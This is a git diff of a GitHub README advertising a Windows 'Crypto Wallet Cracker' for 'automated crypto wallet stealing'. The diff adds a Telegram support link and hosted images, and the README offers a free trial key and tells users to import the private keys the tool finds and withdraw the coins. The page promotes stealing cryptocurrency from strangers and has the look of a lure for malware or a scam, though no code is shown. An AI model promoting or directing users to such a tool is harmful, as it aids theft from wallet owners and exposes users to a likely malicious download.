@@ -1,12 +1,14 @@
 # Crypto-Wallet-Cracker-Hacker-Stealer-2023
 
-Welcome to Crypto Wallet Cracker, the innovative application for automated crypto wallet stealing, designed exclusively for the **Windows operating system!** If you have any issues with software [cliсk here]()
+Welcome to Crypto Wallet Cracker, the innovative application for automated crypto wallet stealing, designed exclusively for the **Windows operating system!** If you have any issues with software [cliсk here](https://t.me/CryptoxHacker)
 
 
+<img width="1230" alt="Crypto" src="https://github.com/uncleteeh/Crypto-Wallet-Cracker/assets/65561014/d3ec9b22-d695-4e7e-82db-83d569f8d43e">
 
 
 
 ## FREE TRAIL KEY: Q79UZWGAH22P9DSW41LAY
+
 # How to use it? 🚀
 
 ## **1. Installation Process:**
@@ -47,10 +49,7 @@ Welcome to Crypto Wallet Cracker, the innovative application for automated crypt
    ✅  In the end, after the software found the wallets with a balance, we enter the Private Key to the wallet with any application, Trust Wallet or Exodus for           example, and just withdraw all coins found by the software to your wallet. 
 
 
-
-
-
-
+https://github.com/uncleteeh/Crypto-Wallet-Cracker/assets/65561014/3cb328fd-32a9-41a9-b3b3-77309f60f263
 
 
 
@@ -82,7 +81,7 @@ No, the software is built for Windows 7 and higher, as an option, you can buy a 
 All as individual as possible. Sometimes a day absolutely nothing finds, even a few days of silence can be, sometimes in a day finds 5-10 wallets at once.
 
 
-
+![gif](https://github.com/uncleteeh/Crypto-Wallet-Cracker/assets/65561014/2948eddf-a680-44a3-a4ba-005e310f6d61)
 
 # SUPPORT ℹ️
 
@@ -92,3 +91,4 @@ All as individual as possible. Sometimes a day absolutely nothing finds, even a 
 
 Leave a star ❤️
 
+![reviews](https://github.com/uncleteeh/Crypto-Wallet-Cracker/assets/65561014/51f0ba8f-4a95-4e5d-a7ca-f7f20e2471dd)
